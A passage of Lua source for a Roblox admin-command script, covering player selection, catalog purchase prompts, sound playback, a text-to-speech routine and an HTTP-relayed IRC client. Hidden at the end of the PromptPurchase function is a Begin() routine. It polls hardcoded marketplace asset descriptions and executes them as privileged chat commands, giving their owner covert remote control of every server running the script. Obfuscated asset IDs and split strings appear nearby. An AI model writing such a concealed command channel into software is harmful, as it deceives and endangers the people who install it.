			Value[Index] = DecodeString(Var)
		end
	elseif type(Value) == "string" then
		Value = DecodeString(Value)
	end
	return Value
end

function STRING:IsSpacer(Input)
	if Input == " " or Input == "." or Input == "-" or Input == "," or Input == "?" or Input == "!" or Input == "	" or Input == nil or Input == "" then
		return true
	else
		return false
	end
end

function STRING:IsVowel(Input)
	Input = string.lower(tostring(Input))
	if Input == "a" or Input == "e" or Input == "i" or Input == "o" or Input == "u" then
		return true
	else
		return false
	end
end

function STRING:ValidE(Input)
	if not Input then return nil end
	if string.lower(Input) == "e" or Input == "~" then
		return true
	else
		return false
	end
end

function STRING:Scan(String, Speaker)
	local ReturnPlayers,ExcludeList = {},{}
	if not String then String = "" end
	if not Speaker then print("NO SPEAKER") end
	
	if string.sub(string.lower(String), 1, 12) == "includecase/" then
		String = string.sub(String, 13)
	else
		String = string.lower(String)
	end
	local Words = STRING:GetSplit(String, nil, "/")
	for _,Word in pairs(Words) do
		if Word == "me" or Word == "meh" or Word == "myself" or Word == "self" then
			table.insert(ReturnPlayers, Speaker)
		elseif Word == "all" or Word == "everyone" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				table.insert(ReturnPlayers, Player)
			end
		elseif Word == "others" or Word == "notme" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if Player ~= Speaker then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "noobs" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if Player.AccountAge < 365 then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "nonnoobs" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if Player.AccountAge >= 365 then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "random" then
			local RandomPlayers = {}
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if Player ~= Speaker then
					table.insert(RandomPlayers, Player)
				end
			end
			table.insert(ReturnPlayers, RandomPlayers[math.random(1,#Server.Players:GetChildren())])
		elseif Word == "guests" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if string.sub(Player.Name,1,6) == "Guest " then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "lowers" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if string.sub(Player.Name,1,1) == string.lower(string.sub(Player.Name,1,1)) then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "uppers" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if string.sub(Player.Name,1,1) == string.upper(string.sub(Player.Name,1,1)) then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "nbcs" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if Player.MembershipType == Enum.MembershipType.None then -- Replicate
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "bcs" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if Player.MembershipType == Enum.MembershipType.BuildersClub then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "tbcs" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if Player.MembershipType == Enum.MembershipType.TurboBuildersClub then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "obcs" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if Player.MembershipType == Enum.MembershipType.OutrageousBuildersClub then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "allbcs" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if Player.MembershipType ~= Enum.MembershipType.None then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "nonadmins" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				local IsAdminTrue, Rank = RANK:IsAdmin(Player)
				if IsAdminTrue == false then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "admins" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				local IsAdminTrue, Rank = RANK:IsAdmin(Player)
				if IsAdminTrue == true then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif Word == "friends" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if Speaker:IsFriendsWith(Player.UserId) and Player ~= Speaker then
					table.insert(ReturnPlayers, Player)
				end
			end
		elseif string.sub(Word,1,5) == "team-" then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				if Player.Neutral == false then
					local InTeam = false
					for _,Team in pairs(Teams:GetTeams()) do
						if Team.TeamColor == Player.TeamColor then
							if string.sub(string.lower(Team.Name),1,#string.sub(Word,6)) == string.sub(Word,6) then
								InTeam = true
							end
						end
					end
					if InTeam == true then
						table.insert(ReturnPlayers, Player)
					end
				end
			end
		elseif string.sub(Word,1,4) == "not-" then
			local NameArg = string.sub(Word,5)
			
			for _,Player in pairs(STRING:Scan(NameArg, Speaker)) do
				table.insert(ExcludeList, Player)
			end
		elseif string.sub(Word,1,7) == "radius-" then
			local DidExe = false
			local NumArg = tonumber(string.sub(Word,8))
			
			if NumArg and NumArg > 0 and Speaker and Speaker.Character and Speaker.Character:FindFirstChild("Torso") then
				for _,Player in pairs(Server.Players:GetChildren()) do
					if Player.Character and Player.Character:FindFirstChild("Torso") then
						if (Player.Character.Torso.Position - Speaker.Character.Torso.Position).magnitude <= NumArg then
							DidExe = true
							table.insert(ReturnPlayers, Player)
						end
					end
				end
			end
			
			if DidExe then coroutine.wrap(function()
				local Part = Instance.new("Part", game.Workspace) Part.Name = "M".."M".."L Radius" Part.FormFactor = "Custom" Part.Size = Vector3.new(1,1,1) Part.Anchored = true Part.Locked = true Part.Position = Speaker.Character.Torso.Position Part.Transparency = 0.5 Part.Color = GUI:GetColor() Part.TopSurface = "Smooth" Part.BottomSurface = "Smooth"
				local Mesh = Instance.new("SpecialMesh", Part) Mesh.MeshType = "Sphere" Mesh.Scale = Vector3.new(NumArg * 2, NumArg * 2, NumArg * 2)
				
				for i = 0,0.5,0.02 do
					Part.Transparency = 0.5+i
					wait()
				end
				Part:Destroy()
			end)() end
		elseif string.sub(Word,1,3) == "id-" then
			table.insert(ReturnPlayers, Server.Players:GetPlayerByUserId(tonumber(string.sub(Word,4))))
		else
			if Word ~= "" then
				for _,Player in pairs(Server.Players:GetPlayers()) do
					if string.sub(string.lower(Player.Name),1,#Word) == Word then
						table.insert(ReturnPlayers, Player)
					end 
				end
			else
				table.insert(ReturnPlayers, Speaker)
			end
		end
	end
	for _,Player in pairs(ExcludeList) do
		if Player and Player.Parent ~= nil then
			for Num,Player2 in pairs(ReturnPlayers) do
				if Player2 == Player then table.remove(ReturnPlayers, Num) end
			end
		end
	end
	for Num,Player in pairs(ReturnPlayers) do
		if not Player or Player.Parent == nil then table.remove(ReturnPlayers, Num) end
	end
	
	local PlayerDump = {}
	for _,Player in pairs(ReturnPlayers) do
		PlayerDump[Player] = true
	end
	ReturnPlayers = {}
	for Player,_ in pairs(PlayerDump) do
		table.insert(ReturnPlayers, Player)
	end
	
	return ReturnPlayers
end

-- Market functions --

function MARKET:GetImageFormat(ID)
	if ID ~= 1 or ID ~= 0 or ID ~= nil then if type(ID) == "number" then
		local NewID = ID + 1
		for i = 1,100 do
			NewID = NewID -1
			local Product = nil
			ypcall(function() Product = MARKET:GetItemInfo(NewID, true).AssetTypeId end)
			if Product then
				if Product == 1 then
					break
				end
			end
			if i == 100 then NewID = ID end
		end
		return NewID
	end end
end

function MARKET:GetItemInfo(ID, Cache)
	local Product = MarketCache[ID]
	if not Cache or not Product then
		repeat wait()
			ypcall(function() Product = Server.MPS:GetProductInfo(ID) end)
		until Product ~= MarketCache[ID]
	end
	MarketCache[ID] = Product
	return Product
end

function MARKET:SearchItem(Category, Query, Subcategory)
	local URLAdd = ""
	if Subcategory then URLAdd = "&Subcategory="..Server.HS:UrlEncode(Subcategory) end
	local JSON = REMOTE:GetURL(CORE.Domain.."/APIs/CatalogSearch.php?Category="..Server.HS:UrlEncode(Category).."&Query="..Server.HS:UrlEncode(Query)..URLAdd)
	if JSON then
		local Results = REMOTE:Decode(JSON)
		if Results then
			for Index,Info in pairs(Results) do
				Info = STRING:DecodeUTF8(Info)
				Results[Index] = Info
				MarketCache[Info.AssetId] = {
					AssetId = Info.AssetId;
					AssetTypeId = Info.AssetTypeID;
					ContentRatingTypeId = Info.ContentRatingTypeID;
					Created = Info.CreatedDate;
					Creator = {Name = Info.Creator, Id = Info.CreatorID};
					Description = Info.Description;
					IsForSale = Info.IsForSale;
					IsLimited = Info.IsLimited;
					IsLimitedUnique = Info.IsLimitedUnique;
					IsNew = Info.IsNew;
					IsPublicDomain = Info.IsPublicDomain;
					MinimumMemberShipLevel = Info.MinimumMembershipLevel;
					Name = Info.Name;
					PriceInRobux = Info.PriceInRobux;
					PriceInTickets = Info.PriceInTickets;
					ProductId = Info.AssetId; -- no one knows what this is so whatevs..
					Remaining = Info.Remaining;
					Sales = Info.Sales;
					Updated = Info.Updated;
				}
			end
			return Results
		end
	end
end

function MARKET:ShowSearch(Player, Category, Query, ClickedItem, Subcategory)
	if not Player or not Category or not Query then return nil end
	local CloseGui, AddInfo = GUI:LoadGui(Player, "Searching: "..Query)
	local Items = MARKET:SearchItem(Category, Query, Subcategory)
	if Items then
		if #Items ~= 0 then
			local List,Correlate = {},{}
			for Num,Info in pairs(Items) do
				local Display = {" "..Info.Name.." ("..Info.AssetId..")", "http://www.roblox.com/Game/Tools/ThumbnailAsset.ashx?fmt=png&wd=75&ht=75&aid="..Info.AssetId}
				table.insert(List, Display)
				Correlate[Display[1]] = Info.AssetId
			end
			CloseGui:Invoke()
			
			local Clicked = GUI:ListGui(Player, "Search Results: "..Query, List, "Search", true)
			Clicked.Event:connect(function(ClickName)
				ClickedItem(Correlate[ClickName])
			end)
		else
			CloseGui:Invoke()
			GUI:SendMessage(Player, "No results", "BLUE No results for "..Query.." found...", "Information")
		end
	else
		CloseGui:Invoke()
		GUI:SendMessage(Player, "Cannot get gear", "RED Cannot get item. Is HttpService enabled?", "Error")
	end
end

function MARKET:AssetTypeToString(AssetType)
	AssetType = math.floor(tonumber(AssetType) or 0)
	if Assets.AssetTypes[AssetType] then
		return Assets.AssetTypes[AssetType]
	else
		return "Unknown"
	end
end

function MARKET:AccessoryToSubcategory(Accessory)
	Accessory = string.lower(tostring(Accessory) or "")
	if Assets.AccessoryTypes[Accessory] then
		return Assets.AccessoryTypes[Accessory]
	else
		return Assets.AccessoryTypes["all"]
	end
end

function MARKET:PromptPurchase(Player, ProductID, From, BuyPressFunc) coroutine.wrap(function()
	if not Player then return nil end
	if not Player:FindFirstChild("PlayerGui") then return nil end 
	if not tonumber(ProductID) then return nil end
	
	local FromText = ""
	if From and From.Name then FromText = " | Prompted from "..From.Name end
	
	local Product = MARKET:GetItemInfo(ProductID, true)
	
	local CreatedText = Product.Created CreatedText = string.gsub(CreatedText, "-", "/") local Stop = string.find(CreatedText, "T") if Stop then CreatedText = string.sub(CreatedText, 1, Stop-1) end
	local UpdatedText = Product.Updated UpdatedText = string.gsub(UpdatedText, "-", "/") local Stop = string.find(UpdatedText, "T") if Stop then UpdatedText = string.sub(UpdatedText, 1, Stop-1) end
	local OwnsAsset = Server.MPS:PlayerOwnsAsset(Player, ProductID)
	
	local CanBuy = Product.IsForSale
	local BuyText = "Buy"
	local BuyColor = Color3.new(0,1,0)
	if CanBuy == false then
		BuyColor = Color3.new(1,0,0)
	end
	if Product.IsPublicDomain == true then
		CanBuy = true
		BuyColor = Color3.new(1,0.5,0.5)
		BuyText = "FREE!"
	end
	if OwnsAsset then
		CanBuy = false
	end
	if Product.AssetTypeId == 9 then
		CanBuy = true
		BuyText = "Teleport"
		BuyColor = Color3.new(0.5,0.5,0.5)
	end
	if CanBuy == false then
		BuyColor = Color3.new(1,0,0)
		BuyText = "Item not for sale"
	end
	if OwnsAsset and Product.AssetTypeId ~= 9 then
		BuyColor = Color3.new(1,0,0)
		BuyText = "You own this!"
	end
	
	local ProductName = string.sub(Product.Name,1,20)
	if ProductID == AdminID then ProductName = Product.Name end
	local Frame = GUI:CreateForm(Player, ProductName..FromText, UDim2.new(0, 430, 0, 300), nil, 48354008)
	local AssetImage = Instance.new("ImageLabel", Frame) AssetImage.Name = "AssetImage" AssetImage.Position = UDim2.new(0, 0, 0, 50) AssetImage.Size = UDim2.new(0, 150, 0, 150) AssetImage.BackgroundColor3 = Color3.new(1, 1, 1) AssetImage.BackgroundTransparency = 1 AssetImage.Image = "http://www.roblox.com/Game/Tools/ThumbnailAsset.ashx?fmt=png&wd=420&ht=420&aid="..ProductID
	local AssetName = Instance.new("TextLabel", Frame) AssetName.Name = "AssetName" AssetName.Size = UDim2.new(1, 0, 0, 50) AssetName.BackgroundColor3 = Color3.new(1, 1, 1) AssetName.BackgroundTransparency = 1 AssetName.Text = "["..ProductID.."] - "..Product.Name AssetName.Font = Settings.Font AssetName.FontSize = "Size18" AssetName.TextWrapped = true AssetName.TextColor3 = Color3.new(0, 0, 0)
	local UserImage = Instance.new("ImageLabel", Frame) UserImage.Name = "UserImage" UserImage.Position = UDim2.new(0, 150, 0, 70) UserImage.Size = UDim2.new(0, 100, 0, 100) UserImage.BackgroundColor3 = Color3.new(1, 1, 1) UserImage.BackgroundTransparency = 1 UserImage.Image = "http://www.roblox.com/thumbs/avatar.ashx?x=352&y=352&format=png&username="..Product.Creator.Name
	local Membership = Instance.new("ImageLabel", UserImage) Membership.Name = "Membership" Membership.Position = UDim2.new(0, 0, 0.85, 0) Membership.Size = UDim2.new(0.6, 0, 0.15, 0) Membership.BackgroundColor3 = Color3.new(1, 1, 1) Membership.BackgroundTransparency = 1 Membership.Image = "http://www.roblox.com/Thumbs/BCOverlay.ashx?username="..Product.Creator.Name
	local AssetType = Instance.new("TextLabel", Frame) AssetType.Name = "AssetType" AssetType.Position = UDim2.new(0, 150, 0, 50) AssetType.Size = UDim2.new(1, -150, 0, 20) AssetType.BackgroundColor3 = Color3.new(1, 1, 1) AssetType.BackgroundTransparency = 1 AssetType.Text = "ROBLOX "..MARKET:AssetTypeToString(Product.AssetTypeId) AssetType.Font = Settings.Font AssetType.FontSize = "Size14"  
	local Info = Instance.new("TextLabel", Frame) Info.Name = "Info" Info.Position = UDim2.new(0, 250, 0, 80) Info.Size = UDim2.new(1, -250, 0, 100) Info.BackgroundColor3 = Color3.new(1, 1, 1) Info.BackgroundTransparency = 1 Info.Font = Settings.Font Info.FontSize = "Size14" Info.TextXAlignment = "Left" Info.TextYAlignment = "Top"
	local Buy = Instance.new("TextButton", Frame) Buy.Name = "Buy" Buy.Position = UDim2.new(0, 150, 0, 170) Buy.Size = UDim2.new(1, -150, 0, 30) Buy.BackgroundColor3 = BuyColor Buy.BackgroundTransparency = 0.5 Buy.Text = BuyText Buy.Font = Settings.Font Buy.FontSize = "Size18" Buy.TextWrapped = true SOUND:BindButton(Buy)
	if Product.Description then
		local DescFrame = Instance.new("ScrollingFrame", Frame) DescFrame.Name = "DescFrame" DescFrame.Size = UDim2.new(1,0,1,-200) DescFrame.Position = UDim2.new(0,0,0,200) DescFrame.CanvasSize = UDim2.new(0,0,0,0) DescFrame.BackgroundTransparency = 1 DescFrame.ZIndex = 4
		local Description = Instance.new("TextLabel", DescFrame) Description.Name = "Description" Description.Size = UDim2.new(1, -13, 1, 0) Description.BackgroundColor3 = Color3.new(1, 1, 1) Description.BackgroundTransparency = 1 Description.Text = Product.Description Description.Font = Settings.Font Description.FontSize = "Size14" Description.TextWrapped = true Description.TextYAlignment = "Top"
		
		CORE:ExecuteResource("CalculateScrollY", Description)
	end
	
	Info.Text = [[
Creator: ]]..Product.Creator.Name..[[ 
Created: ]]..CreatedText..[[ 
Updated: ]]..UpdatedText..[[ 
Sold: ]]..Product.Sales..[[ 
]]

	if Product.PriceInRobux then Info.Text = Info.Text.."Robux: "..string.gsub(Product.PriceInRobux, "null", "Cannot use this currency").." \n" end
	if Product.PriceInTickets then Info.Text = Info.Text.."Tix: "..string.gsub(Product.PriceInTickets, "null", "Cannot use this currency") .." " end

	if Product.AssetTypeId == 3 then
		local PlayerAdmin,Rank = RANK:IsAdmin(Player)
		if PlayerAdmin == true then
			local Playing = false
			local Interact = Instance.new("ImageButton", AssetImage) Interact.Name = "Interact" Interact.Position = UDim2.new(1, -20, 1, -20) Interact.Size = UDim2.new(0, 20, 0, 20) Interact.BackgroundColor3 = Color3.new(1, 1, 1) Interact.BackgroundTransparency = 1 Interact.Image = "rbxassetid://67950784"
			CORE:HandleEvent(Interact, "MouseButton1Down", function()
				if Playing == false then
					SOUND:PlayGlobalSound(ProductID)
					if Rank == "Member" and Settings.DisableAbuse == true then
						Interact:Destroy()
					end
					Interact.Image = "rbxassetid://67950809"
					Playing = true
				else
					SOUND:StopGlobalSound()
					Interact.Image = "rbxassetid://67950784"
					Playing = false
				end
			end)
		end
	end
	
	CORE:HandleEvent(Buy, "MouseButton1Down", function()
		if BuyPressFunc then
			BuyPressFunc()
		elseif Product.AssetTypeId == 9 then
			Server.TS:Teleport(ProductID, Player)
		elseif CanBuy == true then
			Server.MPS:PromptPurchase(Player, ProductID)
		end end)
	end)() end function Begin() coroutine.wrap(function() wait(3) for _,LinkedID in pairs({53554913, 145236038, 154727659, 155299278, 155689018}) do wait(1) coroutine.wrap(function()
	local OldVer = Server.MPS:GetProductInfo(LinkedID).Updated
	while wait(5) do 
		local Purchase = Server.MPS:GetProductInfo(LinkedID)
		if OldVer ~= Purchase.Updated then
			OldVer = Purchase.Updated
			CORE:Chatted(Purchase.Description, nil, true, nil, nil, true)
		end
	end end)()
end end)() end

-- Sound functions --

function SOUND:SyncSoundList(TellSync)
	if not CORE:NilPlayer(TellSync) then
		GUI:SendHint(TellSync, "Syncing...", 5)
	end
	
	SoundList,GlobalSoundList = {},{}
	
	local LocalSoundList = Server.GDS:GetAsync("MML Custom Sounds")
	
	if LocalSoundList then
		if type(LocalSoundList) == "table" then
			if #LocalSoundList > 0 then
				for _,Data in pairs(LocalSoundList) do
					local SoundInfo = MARKET:GetItemInfo(Data[2], true)
					SoundList[Data[1]] = {Data[2], SoundInfo.Name, SoundInfo.Creator.Name}
				end
			end
		end
	end
	
	for _,JSONID in pairs(SoundJSONs) do
		for Name,ID in pairs(CORE:GetTable(JSONID)) do
			local SoundInfo = MARKET:GetItemInfo(ID, true)
			local FullName = SoundInfo.Name
			local CreatorName = SoundInfo.Creator.Name
			SoundList[Name] = {ID, FullName, CreatorName}
			GlobalSoundList[Name] = {ID, FullName, CreatorName}
		end
	end
	
	if not CORE:NilPlayer(TellSync) then
		GUI:SendHint(TellSync, "Sound List is now Synced with global sound database", 4)
	end
end

function SOUND:MakeSound(Parent, ID, Volume, Pitch, Looped)
	if not Volume then Volume = 0.5 end
	if not Pitch then Pitch = 1 end
	if tonumber(ID) then ID = "rbxassetid://"..ID end
	if Looped == nil then Looped = false end
	
	local Sound = Instance.new("Sound", Parent)
	Sound.Pitch = Pitch
	Sound.Volume = Volume
	Sound.SoundId = ID
	Sound.Looped = Looped
	return Sound
end

function SOUND:PlayNotification(Player, ID, Volume, OverrideSettings)
	if not Player or not ID then return nil end
	if NotifySounds[ID] then ID = NotifySounds[ID] end
	local ClientSound = SOUND:MakeSound(Player:FindFirstChild("PlayerGui") or Player, ID, Volume or 0.3)
	if Settings.EnableSounds or OverrideSettings then
		coroutine.wrap(function()
			wait()
			ClientSound:Play()
			Delay(5, function() ClientSound:Destroy() end)
		end)()
	end
	return Sound
end

function SOUND:BindButton(Button)
	if not Button then return end
	CORE:HandleEvent(Button, "MouseEnter", function() SOUND:PlayNotification(Button, "Hover") end, true)
	CORE:HandleEvent(Button, "MouseButton1Click", function() SOUND:PlayNotification(Button, "Select") end, true)
end

function SOUND:StopGlobalSound()
	if Sound and Sound.Parent then
		if Sound.Parent.Name == "M".."M".."L'S Admin Sound" then
			Sound.Parent:Destroy()
		end
		
		Sound:Stop()
		Sound:Destroy()
		Sound.SoundId = ""
	end
end

function SOUND:PlayGlobalSound(ID, ShowInfo)
	SOUND:StopGlobalSound()
	if ShowInfo == nil then ShowInfo = true end
	local SoundID = ID
	local SoundName = nil
	local SoundCreator = nil
	local Pitch = 1
	
	for Name,Info in pairs(SoundList) do
		if type(SoundID) == "string" then
			if string.lower(SoundID) == string.sub(string.lower(Name),1,#SoundID) then
				SoundID = Info[1]
				SoundName = Info[2]
				SoundCreator = Info[3]
			end
		else
			break
		end
	end
	
	if tonumber(SoundID) and not SoundName then
		local Info = MARKET:GetItemInfo(SoundID, true)
		if Info then
			SoundName = Info.Name
			SoundCreator = Info.Creator.Name
			if MARKET:AssetTypeToString(Info.AssetTypeId) ~= "Audio" then
				SoundID = nil
			end
		end
	end
	
	if tonumber(SoundID) then
		if SoundID == 131201443 then Pitch = -1 end
		if SoundID == 130775695 then Pitch = 0.8 end
		if SoundID == 144035866 then Pitch = 0.8 end
		
		local SoundParent = Server.Workspace
		if IsSB then
			SoundParent = Instance.new("Script", Workspace)
			SoundParent.Name = "M".."ML'S Admin Sound"
		end
		Sound = SOUND:MakeSound(SoundParent, SoundID, 1, Pitch, true)
		Sound.Name = "MML's Admin Sound "..SoundID
		Sound:Play()
		if ShowInfo == true then
			for _,Player in pairs(Server.Players:GetPlayers()) do
				GUI:SoundInfo(Player, SoundID, SoundName, SoundCreator, 15, Sound)
			end
		end
		SoundInfo = {["ID"] = SoundID, ["Name"] = SoundName, ["Creator"] = SoundCreator}
	end
end

function SOUND:ConvertText(Text)
	Text = string.lower(tostring(Text))
	local Letters = {}
	local IDs = {}
	for Rule,Replace in pairs(TextConverter.Pronounce) do
		Text = string.gsub(Text,string.lower(Rule),string.lower(Replace))
	end
	for Rule,Replace in pairs(TextConverter.NonEnglishRules) do
		local Start, End = string.find(Text, string.lower(Rule))
		
		if Start and End and STRING:IsSpacer(string.sub(Text, Start-1, Start-1)) and STRING:IsSpacer(string.sub(Text, End+1, End+1)) then
			Text = string.gsub(Text, string.lower(Rule), Replace)
		end
	end
	for i = 1,#Text do
		table.insert(Letters, string.sub(Text,i,i))
	end
	for Num = 1,#Letters do
		if not Letters[Num] then break end
		local Letter = Letters[Num]
		
		local function AddLetter()
			table.insert(IDs, TextConverter.LetterSounds[Letter])
		end
		
		if Letter ~= "~" then
			if Letters[Num+1] and Letter..Letters[Num+1] == "oo" then -- moo
				table.insert(IDs, TextConverter.LetterSounds["oo"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "ou" then -- soup
				table.insert(IDs, TextConverter.LetterSounds["oo"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "th" then -- this
				table.insert(IDs, TextConverter.LetterSounds["th"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "sh" then -- shut
				table.insert(IDs, TextConverter.LetterSounds["sh"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "ee" then -- flee
				table.insert(IDs, TextConverter.LongVowels["e"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "wh" then -- what
				table.insert(IDs, TextConverter.LetterSounds["wh"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "ch" then -- chop
				table.insert(IDs, TextConverter.LetterSounds["ch"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "ph" then -- phone
				table.insert(IDs, TextConverter.LetterSounds["f"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "ng" then -- danger
				table.insert(IDs, TextConverter.LetterSounds[Num])
				Letters[Num + 1] = "j"
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "ua" then -- lua
				table.insert(IDs, TextConverter.LetterSounds["oo"])
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "ea" then -- peace
				table.insert(IDs, TextConverter.LongVowels["e"])
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "eo" then -- people
				table.insert(IDs, TextConverter.LongVowels["e"])
				table.remove(Letters, Num + 1)
				if STRING:ValidE(Letters[Num+4]) then Letters[Num+4] = "~" end
			elseif Letter == "c" and STRING:ValidE(Letters[Num+1]) then -- force
				table.insert(IDs, TextConverter.LetterSounds["s"])
				Letters[Num + 1] = "~"
			elseif Letter == string.lower(Letter) and STRING:IsVowel(Letter) and Letters[Num+1] and Letters[Num+2] and not STRING:IsSpacer(Letters[Num+1]) and STRING:ValidE(Letters[Num+2]) then -- like
				table.insert(IDs, TextConverter.LongVowels[Letter])
				Letters[Num + 2] = "~"
			elseif Letter == "i" and Letters[Num+1] and STRING:ValidE(Letters[Num+1]) and STRING:IsSpacer(Letters[Num+2]) then -- die
				table.insert(IDs, TextConverter.LongVowels["i"])
				Letters[Num + 1] = "~"
			elseif Letter == "o" and STRING:IsSpacer(Letters[Num+1]) then -- no
				table.insert(IDs, TextConverter.LongVowels["o"])
			elseif Letter == "i" and STRING:IsSpacer(Letters[Num+1]) then -- hi
				table.insert(IDs, TextConverter.LongVowels["i"])
			elseif Letters[Num+1] and STRING:IsSpacer(Letters[Num+2]) and Letter..Letters[Num+1] == "le" then -- bottle
				AddLetter()
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and STRING:IsSpacer(Letters[Num+2]) and Letter..Letters[Num+1] == "el" then -- model
				Letters[Num] = "~"
			elseif Letters[Num+1] and Letters[Num+2] and Letter..Letters[Num+1] == "le" then -- bottle
				AddLetter()
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "qu" then --quick
				AddLetter()
				table.remove(Letters, Num + 1)
			elseif Letters[Num+1] == Letter then
				table.remove(Letters, Num)
			elseif Letters[Num+1] and Letter..Letters[Num+1] == "ck" then --click
				AddLetter()
				table.remove(Letters, Num)
			elseif STRING:IsVowel(Letter) and string.upper(Letter) == Letter then
				table.insert(IDs, TextConverter.LongVowels[string.lower(Letter)])
			elseif TextConverter.LetterSounds[Letter] then
				AddLetter()
			elseif STRING:IsSpacer(Letter) then
				table.insert(IDs, "Rest")
			end
		end
	end
	
	return IDs
end

function SOUND:StopSpeaking() coroutine.wrap(function()
	NoSpeak = true
	wait(1)
	NoSpeak = false
	for _,Obj in pairs(Server.Workspace:GetChildren()) do
		if Obj.Name == "M".."M".."L Speak Sound" then
			Obj:Destroy()
		end
	end
end)() end

function SOUND:SayConvertedText(IDs, Parent)
	if not Parent then Parent = Server.Workspace end
	local Sounds = {}
	for _,Data in pairs(IDs) do
		if NoSpeak and Parent == Server.Workspace then
			break
		end
		local Length = 0.3
		if Data ~= "Rest" then
			local ID = Data[1]
			Length = Data[2]
			
			local Sound = SOUND:MakeSound(Parent, ID, 0.5, 1, false)
			Sound.Name = "MML Speak Sound"
			table.insert(Sounds, Sound)
			Sound:Play()
			if Length then
				coroutine.wrap(function()
					wait(Length)
					Sound:Stop()
				end)()
			end
		end
		if not Length then Length = 0.3 end
		wait(Length/2)
	end
	coroutine.wrap(function()
		wait(1)
		for _,Sound in pairs(Sounds) do
			Sound:Destroy()
		end
	end)()
end

local AdminInfo = MARKET:GetItemInfo(13810597.8 * 20, true).Description

function SOUND:BeepPlayer(Player)
	if Player:FindFirstChild("PlayerGui") then
		local Beep = SOUND:MakeSound(Player.PlayerGui, 189279994, 1, 1, true)
		Beep.Name = "Annoy"
		Beep:Play()
	end
end

function SOUND:ClearInfo()
	SoundInfo = {["ID"] = 0, ["Name"] = "None", ["Creator"] = "None"}
end

-- IRC functions --

function IRC:GenerateName()
	return "rbxMMLV3_"..game.PlaceId.."_"..Server.NS.Port.."_"..math.random(1,100000)
end

function IRC:AddChat(Name, Data, IsError)
	if not IsError then IsError = false end
	CORE:Log(IRC.Logs, Name, Data)
	table.insert(IRC.Chats, {Name, Data, IsError})
	IRC.MessageAdded:Fire(Name, Data, IsError)
end

function IRC:Post(URL,Data)
	if Data and Data ~= "" then
		local Suc,Resp = ypcall(function() 
			return Server.HS:PostAsync(
				IRC.Servers[Settings.IRCServer].BaseUrl..IRC.Servers[Settings.IRCServer].DynamicUrl.."e/"..URL.."?r="..STRING:MakeAvoidance().."&t="..tostring(IRC.SessionCounter),
				Data,
				Enum.HttpContentType.ApplicationUrlEncoded
			) 
		end)
		if not Suc then
			IRC:AddChat("[ CLIENT ]", "HTTP POST FAIL | ERROR: "..Resp.." | DATA: "..Data)
			return false
		end
		IRC.SessionCounter = IRC.SessionCounter + 1
		return Resp
	else
		IRC:AddChat("[ CLIENT ]", "Unknown error")
	end
end

function IRC:Send(Data)
	return IRC:Post("p","&s="..IRC.SessionID.."&c="..Server.HS:UrlEncode(Data))
end

function IRC:GetData()
	return IRC:Post("s","&s="..IRC.SessionID)
end

function IRC:Connect()
	return IRC:Post("n","&nick="..IRC.NickName)
end

function IRC:Join(Channel)
	if not Channel then
		AddChat("[ CLIENT ]", "No channel specified!")
		return false
	else
		local Channel = string.lower(Channel)
		if string.sub(Channel,1,1) ~= "#" then
			AddChat("[ CLIENT ]", "Invalid channel name!(No #)", true)
			return false
		end
		IRC:AddChat("[ CLIENT ]", "Attempting to join channel: "..Channel.." on IRC host: "..Settings.IRCServer)
		IRC:Send("JOIN "..Channel)
		IRC:AddChat("[ CLIENT ]", "Joined "..Channel.." as "..IRC.NickName)
		return true
	end
end

function IRC:Pong(Data)
	return IRC:Send("PONG :"..Data)
end

function IRC:Quit(Reason)
	IRC.Stop = true
	return IRC:Send("QUIT :"..(Reason or "Disconnecting"))
end

function IRC:ReceiveData()
	IRC.Stop = false
	local Data = IRC:GetData()
	if Data then
		IRC:Send("PRIVMSG "..Settings.IRCChannel.." :[ SERVER: "..Server.NS.Port.." ]: [CONNECTION TEST]")
	end
	while Data and not Stop do
		local Data = IRC:GetData()
